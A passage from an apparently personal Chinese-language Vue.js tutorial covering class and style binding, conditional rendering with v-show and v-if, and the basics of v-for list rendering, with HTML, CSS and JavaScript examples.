<li><p>3.使用<code>v-bind</code>绑定<code>class</code>，值为定义的变量</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;normal&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;bgGreen&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>效果：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220516185103401.png" alt="image-20220516185103401"></p>
</li>
</ul>
</li>
<li><p>切换单个样式</p>
<ul>
<li><p>定义好多个类名，对应不同的样式</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.bg-green</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">116</span>, <span class="number">236</span>, <span class="number">180</span>, <span class="number">0.56</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.border</span> &#123;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.shadow</span> &#123;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">2px</span> <span class="number">2px</span> <span class="number">5px</span> <span class="number">#c3d2e3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>添加点击事件，随机切换样式</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.normal</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.bg-green</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">116</span>, <span class="number">236</span>, <span class="number">180</span>, <span class="number">0.56</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.border</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.shadow</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">2px</span> <span class="number">2px</span> <span class="number">5px</span> <span class="number">#c3d2e3</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span> = <span class="string">&#x27;normal&#x27;</span> <span class="attr">:class</span>=<span class="string">&quot;myClass&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;changeClass&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">myClass</span>: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">changeClass</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> arr = [<span class="string">&#x27;bg-green&#x27;</span>, <span class="string">&#x27;border&#x27;</span>, <span class="string">&#x27;shadow&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> index = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">3</span>)</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.<span class="property">myClass</span> = arr[index]</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>目标元素将来可能需要绑定一个，或一个以上的样式，见下一小节</p>
</li>
</ul>
<h4 id="1-12-1-2-数组写法"><a href="#1-12-1-2-数组写法" class="headerlink" title="1.12.1.2.数组写法"></a>1.12.1.2.数组写法</h4><p>应用场景：目标元素将来可能需要绑定一个，或一个以上的样式</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.normal</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.bg-green</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">116</span>, <span class="number">236</span>, <span class="number">180</span>, <span class="number">0.56</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.border</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.shadow</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">2px</span> <span class="number">2px</span> <span class="number">5px</span> <span class="number">#c3d2e3</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;normal&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;arr&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">arr</span>: [<span class="string">&#x27;bg-green&#x27;</span>,<span class="string">&#x27;border&#x27;</span>,<span class="string">&#x27;shadow&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>要绑定样式的个数不确定，名字也不确定，适合用数组写法</p>
<h4 id="1-12-1-3-对象写法"><a href="#1-12-1-3-对象写法" class="headerlink" title="1.12.1.3.对象写法"></a>1.12.1.3.对象写法</h4><p>绑定的样式个数确定，名字也确定，只是不确定用不用的时候，适合用对象写法</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;normal&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;arr&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>arr</code>是个对象</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span><br><span class="line">    <span class="attr">arr</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;bg-green&#x27;</span>: <span class="literal">true</span>, <span class="comment">// 如果类名是分段的，记得key加引号</span></span><br><span class="line">        <span class="attr">border</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">shadow</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>



<h3 id="1-12-2-style绑定"><a href="#1-12-2-style绑定" class="headerlink" title="1.12.2.style绑定"></a>1.12.2.<code>style</code>绑定</h3><p>绑定<code>style</code>样式的对象写法</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;normal&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;styleObj&quot;</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">styleObj</span>: &#123;</span><br><span class="line">            <span class="attr">fontSize</span>: <span class="string">&#x27;40px&#x27;</span>, <span class="comment">// 注意key用小驼峰命名，key对应css中的属性</span></span><br><span class="line">            <span class="attr">backgroundColor</span>: <span class="string">&#x27;blue&#x27;</span> </span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>绑定<code>style</code>样式的数组写法（比较少见） </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;normal&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;[styleObj1, styleObj2]&quot;</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">styleObj1</span>: &#123;</span><br><span class="line">        <span class="attr">backgroundColor</span>: <span class="string">&#x27;blue&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">styleObj2</span>: &#123;</span><br><span class="line">        <span class="attr">fontSize</span>: <span class="string">&#x27;40px&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>也可以写成：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;normal&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;styleArr&quot;</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">styleArr</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">fontSize</span>: <span class="string">&#x27;40px&#x27;</span>,</span><br><span class="line">            <span class="attr">color</span>: <span class="string">&#x27;red&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">backgroundColor</span>: <span class="string">&#x27;blue&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p><code>style</code>的写法可以通过三元表达式来动态控制样式</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item-list clearfix&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;display: currentIndex==index ? &#x27;block&#x27;: &#x27;none&#x27;&#125;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="1-12-3-小结：样式绑定"><a href="#1-12-3-小结：样式绑定" class="headerlink" title="1.12.3.小结：样式绑定"></a>1.12.3.小结：样式绑定</h3><p><code>class</code>样式</p>
<ul>
<li>写法：<code>:class=&quot;xxx&quot;</code>，<code>xxx</code>可以是字符串、对象、数组<ul>
<li>字符串写法适用于：类名不确定，要动态获取</li>
<li>对象写法适用于：要绑定多个样式，个数不确定，名字也不确定</li>
<li>数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用</li>
</ul>
</li>
</ul>
<p><code>style</code>样式</p>
<ul>
<li><code>:style=&quot;&#123;fontSize: xxx&#125;&quot;</code>，其中<code>xxx</code>是动态值</li>
<li><code>:style=[a, b]</code>，其中<code>a</code>、<code>b</code>是样式对象</li>
</ul>
<h2 id="1-13-条件渲染"><a href="#1-13-条件渲染" class="headerlink" title="1.13.条件渲染"></a>1.13.条件渲染</h2><h3 id="1-13-1-条件渲染指令"><a href="#1-13-1-条件渲染指令" class="headerlink" title="1.13.1.条件渲染指令"></a>1.13.1.条件渲染指令</h3><h4 id="1-13-1-1-v-show"><a href="#1-13-1-1-v-show" class="headerlink" title="1.13.1.1.v-show"></a>1.13.1.1.<code>v-show</code></h4><p>通过控制<code>display</code>属性，来实现元素的显示与隐藏</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220520150023941.png" alt="image-20220520150023941"></p>
<p>使用布尔值：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-show</span>=<span class="string">&quot;false&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用能转为布尔值的表达式：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-show</span>=<span class="string">&quot;1 === 3&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="1-13-1-2-v-if"><a href="#1-13-1-2-v-if" class="headerlink" title="1.13.1.2.v-if"></a>1.13.1.2.<code>v-if</code></h4><p>通过注释的形式，结构消失的很彻底</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220520150438839.png" alt="image-20220520150438839"></p>
<p>使用布尔值：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-if</span>=<span class="string">&quot;false&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用能转为布尔值的表达式：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-show</span>=<span class="string">&quot;1 === 3&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="1-13-1-3-动态控制元素的显示和隐藏"><a href="#1-13-1-3-动态控制元素的显示和隐藏" class="headerlink" title="1.13.1.3.动态控制元素的显示和隐藏"></a>1.13.1.3.动态控制元素的显示和隐藏</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n--&quot;</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>n的值为：&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-show</span>=<span class="string">&quot;n===1&quot;</span>&gt;</span>vue<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-show</span>=<span class="string">&quot;n===2&quot;</span>&gt;</span>react<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-show</span>=<span class="string">&quot;n===3&quot;</span>&gt;</span>angluar<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220520151211090.png" alt="image-20220520151211090"></p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220520151228232.png" alt="image-20220520151228232"></p>
<p>备注：如果存在多个判断，建议使用<code>v-if</code>、<code>v-else-if</code>，但是，如果切换的频率较快，建议使用<code>v-show</code></p>
<p>如果条件结构中包含多个<code>dom</code>，一般想到的是用一个大的<code>div</code>包裹一下，但会多出来一个<code>dom</code>节点</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-show</span>=<span class="string">&quot;n===1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>vue<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>react<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>angluar<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220520152548423.png" alt="image-20220520152548423"></p>
<p>可以使用<code>template</code>来包裹，这样渲染时就不会多出来一个节点了，但是要注意<code>template</code>只能和<code>v-if</code>配合使用</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">&quot;n===1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>vue<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>react<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>angluar<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220520152500862.png" alt="image-20220520152500862"></p>
<h3 id="1-13-2-小结：条件渲染"><a href="#1-13-2-小结：条件渲染" class="headerlink" title="1.13.2.小结：条件渲染"></a>1.13.2.小结：条件渲染</h3><p><code>v-if</code></p>
<ul>
<li>写法：<ul>
<li><code>v-if=&quot;表达式&quot;</code></li>
<li><code>v-else-if=&quot;表达式&quot;</code></li>
<li><code>v-else=&quot;表达式&quot;</code></li>
</ul>
</li>
<li>适用于：切换频率较低的场景</li>
<li>特点：不展示的<code>Dom</code>直接被移除</li>
<li>注意：<code>v-if</code>可以和<code>v-else-if</code>、<code>v-else</code>一起使用，但要求结构不能被“打断”</li>
</ul>
<p><code>v-show</code></p>
<ul>
<li>写法：<ul>
<li><code>v-show=&quot;表达式&quot;</code></li>
<li>适用于：切换频率较高的场景</li>
<li>特点：不展示的<code>Dom</code>未被移除，仅仅是使用样式隐藏掉</li>
</ul>
</li>
</ul>
<p>备注：</p>
<p>使用<code>v-if</code>时，如果判断值为<code>false</code>，元素无法获取到，而使用<code>v-show</code>一定可以获取到节点元素</p>
<h2 id="1-14-列表渲染"><a href="#1-14-列表渲染" class="headerlink" title="1.14.列表渲染"></a>1.14.列表渲染</h2><h3 id="1-14-1-v-for基本使用"><a href="#1-14-1-v-for基本使用" class="headerlink" title="1.14.1.v-for基本使用"></a>1.14.1.<code>v-for</code>基本使用</h3><p><code>v-for</code></p>
<ul>
<li>使用<code>v-for</code>渲染时，必须指定<code>key</code>作为唯一标识，其值可以用<code>index</code>，也可以用原数据的<code>id</code></li>
<li>只有两个形参</li>
<li>遍历数组：<code>v-for=&quot;(item, index) in arr&quot; :key=index</code></li>
<li>遍历对象：<code>v-for=&quot;(value, key) of obj&quot; :key=key</code></li>
<li>遍历字符串：<code>v-for=&quot;(char, index) of str&quot; :key=index</code></li>
<li>遍历指定次数：<code>v-for=&quot;(number, index) of 5&quot; :key=index</code></li>
</ul>
